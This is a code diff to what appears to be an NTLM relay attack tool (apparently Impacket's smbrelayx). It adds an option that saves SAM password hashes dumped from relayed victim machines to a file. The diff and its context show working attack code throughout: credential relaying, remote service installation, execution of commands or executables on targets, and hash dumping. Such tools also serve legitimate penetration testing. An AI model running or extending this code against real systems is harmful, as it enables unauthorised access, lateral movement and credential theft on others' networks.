@@ -59,7 +59,7 @@ except Exception:
     logging.critical("See http://www.pycrypto.org/")
 
 class doAttack(Thread):
-    def __init__(self, SMBClient, exeFile, command):
+    def __init__(self, SMBClient, exeFile, command, samdumpFile):
         Thread.__init__(self)
 
         if isinstance(SMBClient, smb.SMB) or isinstance(SMBClient, smb3.SMB3):
@@ -69,6 +69,7 @@ class doAttack(Thread):
 
         self.__exeFile = exeFile
         self.__command = command
+        self.__samdumpFile = samdumpFile
         self.__answerTMP = ''
         if exeFile is not None:
             self.installService = serviceinstall.ServiceInstall(SMBClient, exeFile)
@@ -113,7 +114,12 @@ class doAttack(Thread):
                     remoteOps._RemoteOperations__serviceDeleted = True
                     samFileName = remoteOps.saveSAM()
                     samHashes = SAMHashes(samFileName, bootKey, isRemote = True)
-                    samHashes.dump()
+                    answers = samHashes.dump()
+                    with open(self.__samdumpFile, "a") as fp:
+                        for answer in answers:
+                            fp.write(answer)
+                            fp.write("\n")
+
                     logging.info("Done dumping SAM hashes for host: %s", self.__SMBConnection.getRemoteHost())
             except Exception, e:
                 logging.error(str(e))
@@ -497,7 +503,7 @@ class HTTPRelayServer(Thread):
                     if self.server.outputFile is not None:
                         writeJohnOutputToFile(ntlm_hash_data['hash_string'], ntlm_hash_data['hash_version'], self.server.outputFile)
 
-                    clientThread = doAttack(self.client,self.server.exeFile,self.server.command)
+                    clientThread = doAttack(self.client,self.server.exeFile,self.server.command, self.samdumpFile)
                     clientThread.start()
                     # And answer 404 not found
                     self.send_response(404)
@@ -507,7 +513,7 @@ class HTTPRelayServer(Thread):
                     self.end_headers()
             return 
 
-    def __init__(self, outputFile=None):
+    def __init__(self, outputFile=None, samdumpFile=None):
         Thread.__init__(self)
         self.daemon = True
         self.domainIp = None
@@ -518,6 +524,7 @@ class HTTPRelayServer(Thread):
         self.target = None
         self.mode = None
         self.outputFile = outputFile
+        self.samdumpFile = samdumpFile
 
     def setTargets(self, target):
         self.target = target
@@ -542,7 +549,7 @@ class HTTPRelayServer(Thread):
         httpd.serve_forever()
 
 class SMBRelayServer(Thread):
-    def __init__(self, outputFile = None):
+    def __init__(self, outputFile = None, samdumpFile = None):
         Thread.__init__(self)
         self.daemon = True
         self.server = 0
@@ -553,6 +560,7 @@ class SMBRelayServer(Thread):
         self.machineHashes = None
         self.exeFile = None
         self.command = None
+        self.samdumpFile = samdumpFile
 
         # Here we write a mini config for the server
         smbConfig = ConfigParser.ConfigParser()
@@ -729,7 +737,7 @@ class SMBRelayServer(Thread):
                     if self.server.getJTRdumpPath() != '':
                         writeJohnOutputToFile(ntlm_hash_data['hash_string'], ntlm_hash_data['hash_version'], self.server.getJTRdumpPath())
                     del (smbData[self.target])
-                    clientThread = doAttack(smbClient,self.exeFile,self.command)
+                    clientThread = doAttack(smbClient,self.exeFile,self.command,self.samdumpFile)
                     clientThread.start()
                     # Now continue with the server
                 #############################################################
@@ -793,7 +801,7 @@ class SMBRelayServer(Thread):
                 if self.server.getJTRdumpPath() != '':
                     writeJohnOutputToFile(ntlm_hash_data['hash_string'], ntlm_hash_data['hash_version'], self.server.getJTRdumpPath())
                 del (smbData[self.target])
-                clientThread = doAttack(smbClient,self.exeFile,self.command)
+                clientThread = doAttack(smbClient,self.exeFile,self.command,self.samdumpFile)
                 clientThread.start()
                 # Remove the target server from our connection list, the work is done
                 # Now continue with the server
@@ -857,8 +865,8 @@ if __name__ == '__main__':
     parser.add_argument('-h', action='store', metavar = 'HOST', help='Host to relay the credentials to, if not it will relay it back to the client')
     parser.add_argument('-e', action='store', required=False, metavar = 'FILE', help='File to execute on the target system. If not specified, hashes will be dumped (secretsdump.py must be in the same directory)')
     parser.add_argument('-c', action='store', type=str, required=False, metavar = 'COMMAND', help='Command to execute on target system. If not specified, hashes will be dumped (secretsdump.py must be in the same directory)')
-    parser.add_argument('-outputfile', action='store',
-                        help='base output filename for encrypted hashes. Suffixes will be added for ntlm and ntlmv2')
+    parser.add_argument('-outputfile', action='store', help='base output filename for encrypted hashes. Suffixes will be added for ntlm and ntlmv2')
+    parser.add_argument('-samdumpfile', action='store', help='output filename to store the hashes dumped from the SAM hive')
     parser.add_argument('-machine-account', action='store', required=False, help='Domain machine account to use when interacting with the domain to grab a session key for signing, format is domain/machine_name')
     parser.add_argument('-machine-hashes', action="store", metavar = "LMHASH:NTHASH", help='Domain machine hashes, format is LMHASH:NTHASH')
     parser.add_argument('-domain', action="store", help='Domain FQDN or IP to connect using NETLOGON')
@@ -882,7 +890,7 @@ if __name__ == '__main__':
     Command = options.c
 
     for server in RELAY_SERVERS:
-        s = server(options.outputfile)
+        s = server(options.outputfile, options.samdumpfile)
         s.setTargets(targetSystem)
         s.setExeFile(exeFile)
         s.setCommand(Command)
